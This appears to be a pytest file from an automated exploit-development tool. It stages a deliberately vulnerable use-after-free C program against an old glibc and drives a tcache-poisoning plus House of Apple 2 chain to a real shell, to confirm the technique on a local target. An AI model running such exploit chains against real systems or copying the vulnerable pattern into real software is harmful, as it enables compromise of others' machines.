"""OLD-GLIBC CONFIRMATION LANE: the automated glibc-heap -> shell chain (tcache poison of
_IO_2_1_stdout_ + House of Apple 2) is version-gated and SKIPS on a hardened (>=2.43) build host
(see tests/test_heap_fsop.py, `glibc_hardened_heap`). That left the crown-jewel heap technique only
STRUCTURALLY tested here. This lane pulls a real pre-hardening glibc (2.36-2.42) from the container
overlay store, stages a self-contained UAF target against it (patchelf its interpreter + rpath into
the target's own dir so the sandbox sees them), measures that glibc's main_arena+0x60 offset, and
drives leak.heap_fsop_exploit to a REAL shell -- turning the skip into an end-to-end confirmation.

Skips cleanly where no such glibc is reachable (a host without the container overlays / the env
override), so it is a bonus confirmation, never a false failure."""
import os
import shutil
import subprocess
import time

import pytest
from _env import find_old_glibc
from lykos.analyze.poc import leak

_OLD = find_old_glibc()
_GCC = shutil.which("gcc") or shutil.which("cc")
_PATCHELF = shutil.which("patchelf")
_SETARCH = shutil.which("setarch")

# A menu-style notes target with a UAF (pointer not nulled on free). -std=gnu11 keeps scanf from
# being redirected to __isoc23_scanf@GLIBC_2.38, so a host-compiled binary still LOADS on an older
# glibc (>=2.34 for __libc_start_main). Identical shape to tests/test_heap_fsop.py's notes_bin.
_NOTES_C = (
    '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n'
    'char* n[32]; unsigned long sz[32];\n'
    'int rn(){int i; if(scanf("%d",&i)!=1)exit(0); return i;}\n'
    'unsigned long rz(){unsigned long z; if(scanf("%lu",&z)!=1)exit(0); return z;}\n'
    'int main(){ setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0);\n'
    ' while(1){ printf("> "); switch(rn()){\n'
    '  case 1:{int i=rn(); sz[i]=rz(); n[i]=malloc(sz[i]); read(0,n[i],sz[i]); break;}\n'
    '  case 2:{int i=rn(); free(n[i]); break;}\n'
    '  case 3:{int i=rn(); write(1,n[i],sz[i]); break;}\n'
    '  case 4:{int i=rn(); read(0,n[i],sz[i]); break;}\n'
    '  case 5: exit(0);} } }\n')
# Probe: a lone freed 0x430 chunk's fd points at main_arena+0x60; print it, then pause so its maps
# stay live while we read the libc base.
_PROBE_C = ('#include <stdlib.h>\n#include <unistd.h>\n'
            'int main(){ void*a=malloc(0x430); malloc(0x430); free(a);\n'
            '  write(1,a,8); char c; read(0,&c,1); return 0; }\n')


def _stage(workdir, src_c, name):
    """Compile src_c, copy the old libc + loader into workdir, patchelf the binary to load them."""
    _ver, libc_src, ld_src = _OLD
    libc, ld = workdir / "libc.so.6", workdir / "ld.so"
    if not libc.exists():
        shutil.copy(libc_src, libc)
        shutil.copy(ld_src, ld)
        os.chmod(ld, 0o755)
    c = workdir / f"{name}.c"
    c.write_text(src_c)
    exe = workdir / name
    if subprocess.run([_GCC, "-no-pie", "-fno-stack-protector", "-std=gnu11", "-U_FORTIFY_SOURCE",
                       "-w", str(c), "-o", str(exe)], capture_output=True).returncode:
        return None
    if subprocess.run([_PATCHELF, "--set-interpreter", str(ld), "--set-rpath", str(workdir),
                       str(exe)], capture_output=True).returncode:
        return None
    return exe


def _arena_offset(probe_exe):
    """main_arena+0x60 offset in the old libc = (printed arena ptr) - (libc base from /proc/maps)."""
    cmd = ([_SETARCH, "-R"] if _SETARCH else []) + [str(probe_exe)]
    p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                         stderr=subprocess.DEVNULL)
    try:
        time.sleep(0.3)
        leaked = p.stdout.read(8)
        if len(leaked) < 8:
            return None
        arena = int.from_bytes(leaked, "little")
        base = None
        for line in open(f"/proc/{p.pid}/maps"):
            if "libc.so.6" in line:
                base = int(line.split("-")[0], 16)
                break
        return (arena - base) if base else None
    finally:
        try:
            p.stdin.write(b"\n")
            p.stdin.flush()
        except OSError:
            pass
        p.kill()


@pytest.mark.skipif(_OLD is None, reason="no pre-hardening glibc (2.36-2.42) found in the container "
                    "overlays or $LYKOS_OLD_GLIBC_DIR; the heap->shell confirmation lane needs one")
@pytest.mark.skipif(not (_GCC and _PATCHELF), reason="needs gcc + patchelf to stage the old-glibc target")
def test_heap_fsop_shell_confirmed_on_old_glibc(tmp_path):
    """End-to-end: drive a UAF notes target running against a real pre-hardening glibc through the
    automated libc leak -> tcache poison of _IO_2_1_stdout_ -> House of Apple 2 -> shell. CONFIRMS
    the technique that `glibc_hardened_heap` skips on this 2.43 host."""
    ver, libc_src, _ld = _OLD
    notes = _stage(tmp_path, _NOTES_C, "v")
    probe = _stage(tmp_path, _PROBE_C, "probe")
    if not (notes and probe):
        pytest.skip("could not stage the old-glibc target")
    # sanity: the target actually loads and runs under the old glibc
    r = subprocess.run([str(notes)], input=b"5\n", capture_output=True, timeout=10)
    assert r.returncode == 0, f"notes target did not run under glibc {ver}"
    off = _arena_offset(probe)
    # main_arena+0x60 sits deep in libc's data; its exact page offset is version-specific (0xAC8 on
    # the host 2.43, 0xB20 on 2.41, ...), so only sanity-bound it -- the exploit landing is the real
    # check.
    assert off and 0x100000 < off < 0x400000, f"arena offset looks wrong for glibc {ver}: {off!r}"
    libc_data = open(libc_src, "rb").read()

    def add(i, s, data):
        return f"1\n{i}\n{s}\n".encode() + data.ljust(1, b"A")

    res = leak.heap_fsop_exploit(
        notes, tmp_path, add=add, free=lambda i: f"2\n{i}\n".encode(),
        view=lambda i: f"3\n{i}\n".encode(), edit=lambda i, data: f"4\n{i}\n".encode() + data,
        exit_seq=b"5\n", libc_data=libc_data, unsorted_off=off, poison_size=0x300,
        guard_size=0x430, timeout=15.0)
    assert res["ok"], (f"auto heap->shell failed on glibc {'.'.join(map(str, ver))}: "
                       f"{res.get('reason')} (base={res.get('libc_base')})")
    assert res["libc_base"] % 0x1000 == 0
